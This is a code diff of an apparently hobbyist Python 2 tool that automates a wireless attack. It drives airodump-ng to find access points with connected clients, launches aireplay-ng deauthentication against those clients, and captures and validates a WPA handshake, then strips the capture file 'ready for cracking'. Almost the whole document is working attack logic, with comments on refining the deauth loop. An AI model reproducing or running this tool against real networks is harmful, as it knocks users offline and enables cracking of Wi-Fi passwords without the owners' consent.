@@ -9,10 +9,10 @@ from subprocess import Popen, call, PIPE
 from signal import SIGINT, SIGTERM
 from multiprocessing import Process, Pipe
 from validate import validator
-from scanner_obj import scanner
+from scanner import scanner
 from watchdog.events import PatternMatchingEventHandler  
 from watchdog.observers import Observer
-from xml_arse_obj import xml_machine
+from xml_arse import xml_machine
 
 ####improvements:
 ####
@@ -21,8 +21,6 @@ from xml_arse_obj import xml_machine
 ##create temp folders automatically and clean up when finished
 ##
 #Refine the timing of the inject/check/inject cycle.
-#
-#Cycle through list of attached clients and deauth all in series
 #
 #Report on make/model of attached clients
 #
@@ -56,14 +54,15 @@ class MyHandler(PatternMatchingEventHandler):
 			for cracker in crackable_list:
 				deets = w_xml.parse_deets(cracker)
 				if deets != 'None':
-					if deets["client_count"] != 0:
-						w_xml.xml_tree(essid=deets["essid"], 
-						channel=deets["channel"], 
-						bssid=deets["bssid"], 
-						packets=deets["packets"], 
-						client_list=deets["client_list"]),
-						client_count=deets["client_count"],
-						w_xml.xml_write(target_dir+cracker+'.xml')
+					if deets["essid"] != 'petonehappinessclub': 	##ignore this AP
+						if deets["client_count"] != 0:
+							w_xml.xml_tree(essid=deets["essid"], 
+							channel=deets["channel"], 
+							bssid=deets["bssid"], 
+							packets=deets["packets"], 
+							client_list=deets["client_list"],
+							client_count=deets["client_count"],)
+							w_xml.xml_write(target_dir+cracker+'.xml')
 
 	def on_modified(self, event):
 		print "modified observer =", observer
@@ -122,11 +121,11 @@ if __name__ == '__main__':
 	print  "Creating process for folder watch"
 	observer = Observer()
 	observer.schedule(MyHandler(), path=output_dir)
-	print "Attempting to start general scan...."
+	print "Starting general scan...."
 	airodump.start()
 	scanning = True
 	time_started = time.time()
-	print "time_started:%.0f" % time_started
+	#print "time_started:%.0f" % time_started			#debug
 	print "Starting folder watchdog..."
 	observer.start()
 	while True:
@@ -134,14 +133,14 @@ if __name__ == '__main__':
 		airodump_parent_conn.send(scanning)
 		print "General scan now running for: %.0f seconds" % (time.time() - time_started)
 		file_list = os.listdir(target_dir)
-		if time.time() - time_started >= 30:
+		if time.time() - time_started >= 60:
 			print "times up, aborting general scan bitches..."	
 			scanning = False
 			break
 		if file_list != []:
 			print "targets detected, aborting general scan bitches..."
 			scanning = False
-			break	   
+			break		   
 	observer.stop()		
 	airodump_parent_conn.send(scanning)
 	airodump_parent_conn.close()
@@ -154,7 +153,6 @@ if __name__ == '__main__':
 		f_xml_deets = f_xml.parse_deets(f_xml.parse_name())
 		print "f_xml_deets:", f_xml_deets
 #start airodump-ng focussed attack using deets parsed from xml
-##imporve this by adding client-mac details
 		print "creating focussed scanner object"
 		f_scanner = scanner(iface)
 		#print "f_scanner:", f_scanner					#debug
@@ -172,17 +170,16 @@ if __name__ == '__main__':
 		f_deauth = Process(target=f_scanner.deauth, kwargs={ 
 		'essid':f_xml_deets["essid"],
 		'bssid':f_xml_deets["bssid"],
-		'client_MAC':(f_xml_deets["client_list"][0]),
+		'client_MAC':(f_xml_deets["client_list"]),	#expects a list
 		'conn':deauth_child_conn})
-		scanning = True
-		print "Attempting to start focussed airodump process..."
 #start airodump-ng process - focussed this time
+		print "Attempting to start focussed airodump process..."
 		f_airodump.start()
 #start aireply-ng process with deauth method. This could be more refined to focus on loop of listed clients
 		print "Attempting to start deauth process..."
 		f_deauth.start()
 		time_started = time.time()
-		#print "time_started:%.0f", % time_started			#debug
+		scanning = True
 		while True:
 			f_airodump_parent_conn.send(scanning)
 			deauth_parent_conn.send(scanning)
@@ -190,20 +187,19 @@ if __name__ == '__main__':
 ##scan pcap file for valid handshake EAPOL packets
 			print "Validating handshake..."
 			files_handshake = os.listdir(handshake_dir)
-			for file in files_handshake:
+			for file in files_handshake:				##This is rubbish, improve!!!
 				handshake_file = (handshake_dir+file)        
-				valid = validator(SSID=(f_xml_deets["essid"]), BSSID=(f_xml_deets["bssid"]), capfile=handshake_file)
+				valid = validator(SSID=(f_xml_deets["essid"]), 
+				BSSID=(f_xml_deets["bssid"]), 
+				capfile=handshake_file)
 			check_hs = valid.validate_handshake()
 			print "validation result:", check_hs
 			if check_hs != True:
+				print "Analyzing handshake..."
 				check_hs = valid.analyze()					#what to do with this?
-			time.sleep(2)
-			print "analyze result:", check_hs
-#when handshake detected stop focussed attack			
-			if check_hs == True:
-				check_hs = valid.analyze()					#what to do with this?
-				time.sleep(2)				
 				print "analyze result:", check_hs
+#when handshake detected stop focussed attack			
+			if check_hs == True:			
 				print "Handshake captured, my job here is done..."	
 				scanning = False
 				f_airodump_parent_conn.send(scanning)
@@ -225,13 +221,17 @@ if __name__ == '__main__':
 	else:
 		print "No suitable networks detected."
 	if check_hs == True:
+		print "Stripping handshake cap file of unnecessary packets"
 		valid.strip(handshake_dir+'strip.cap')
-		strip_valid = validator(SSID=(f_xml_deets["essid"]), BSSID=(f_xml_deets["bssid"]), capfile=handshake_dir+'strip.cap')
+		print "Vaidating stripped cap file..."
+		strip_valid = validator(SSID=(f_xml_deets["essid"]), 
+		BSSID=(f_xml_deets["bssid"]), 
+		capfile=handshake_dir+'strip.cap')
 		strip_check_hs = strip_valid.validate_handshake()
 		if strip_check_hs == True:
 			print "Valid handshake detected and stripped cap file ready for cracking!"
 		elif strip_check_hs != True:
-			print "something went wrong with stri or validate process...."	
+			print "something went wrong with stripped validate process...."	
 	print "up to here..."		
 #process handshake file if required here: analyze, strip and validate
 
